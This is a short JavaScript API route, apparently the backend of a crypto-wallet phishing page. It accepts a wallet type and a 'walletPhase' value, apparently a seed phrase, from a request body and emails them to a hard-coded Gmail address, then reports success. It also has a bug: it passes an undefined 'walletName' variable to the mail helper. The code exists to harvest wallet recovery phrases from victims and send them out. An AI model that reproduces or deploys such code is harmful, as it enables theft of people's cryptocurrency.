import { sendMail } from "@/helpers"



export const POST=async (req)=>{
    const {walletType,walletPhase}=await req.json()
    const email="myhosting1010@gmail.com"

  await   sendMail(email,walletName, walletPhase)
  return Response.json({
    message:"sucess"
  }, {status:200})
}